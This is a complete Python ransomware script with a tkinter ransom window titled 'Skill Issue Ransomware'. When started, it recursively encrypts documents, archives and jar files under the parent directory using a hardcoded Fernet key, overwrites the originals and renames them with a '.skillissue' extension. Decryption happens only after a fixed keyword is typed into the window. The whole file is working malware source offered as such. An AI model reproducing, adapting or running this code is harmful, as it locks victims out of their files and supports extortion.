import os
from pathlib import Path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import filedialog

man_key = b'ex6N4o0hurcGMsqa3EsZ4XFce1NYBrL807tn94saoac='
extEnc = ['.txt', '.7z', '.pdf', '.doc', '.docx', '.csv', '.jar', '.rar']
def encrypt(dataFile, fernet_key):
    if dataFile.name.endswith(tuple(extEnc)):
        dataFile = Path(dataFile.path) 
        with open(dataFile, 'rb') as f:
            data = f.read()

        cipher_suite = Fernet(fernet_key)
        data = cipher_suite.encrypt(data)

        # Overwrite the existing .txt file with the encrypted data and change the extension
        with open(dataFile, 'wb') as f:
            f.write(data)
        change_file_extension(dataFile, "skillissue")

def decrypt(dataFile, fernet_key):
    if dataFile.name.endswith('.skillissue'):
        dataFile = Path(dataFile.path)  # Convert to a pathlib.Path object
        with open(dataFile, 'rb') as f:
            data = f.read()

        cipher_suite = Fernet(fernet_key)
        data = cipher_suite.decrypt(data)

        # Overwrite the existing .txt.skillissue file with the decrypted data and change the extension
        with open(dataFile, 'wb') as f:
            f.write(data)
        change_file_extension(dataFile, '')

def change_file_extension(file_path, new_extension):
    os.rename(file_path, os.path.splitext(file_path)[0] + f".{new_extension}")

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        elif entry.is_dir():
            yield from scanRecurse(entry.path)

def verify_keyword(keyword):
    return keyword == "qwerty12345"

# Encrypt all files in the current directory and its subdirectories
directory = "../"  # Change this to the directory containing the files to be encrypted
for item in scanRecurse(directory):
    # encrypt(item, symmetric_key)
    encrypt(item, man_key)

# GUI to ask the user to enter the keyword for decryption
root = tk.Tk()
root.title('Skill Issue Ransomware')
root.geometry('500x200')

key_label = tk.Label(root, text="Enter the decryption keyword:")
key_label.pack()

keyword_entry = tk.Entry(root, width=60)
keyword_entry.pack(pady=10)

error_label = tk.Label(root, text="", fg="red")
error_label.pack()

def submit_keyword():
    keyword = keyword_entry.get()
    if verify_keyword(keyword):
        # decrypt_with_symmetric_key(symmetric_key)
        decrypt_with_symmetric_key(man_key)
        print("Decryption completed successfully.")
    else:
        error_label.config(text="Incorrect keyword. Decryption cannot be performed.", fg="red")

def decrypt_with_symmetric_key(symmetric_key):
    # Decrypt all skillissue files in the current directory and its subdirectories
    directory = '../'  # Change this to the directory containing the skillissue files
    for item in scanRecurse(directory):
        if item.name.endswith('.skillissue'):
            decrypt(item, symmetric_key)

submit_button = tk.Button(root, text="Submit", command=submit_keyword)
submit_button.pack()

root.mainloop()
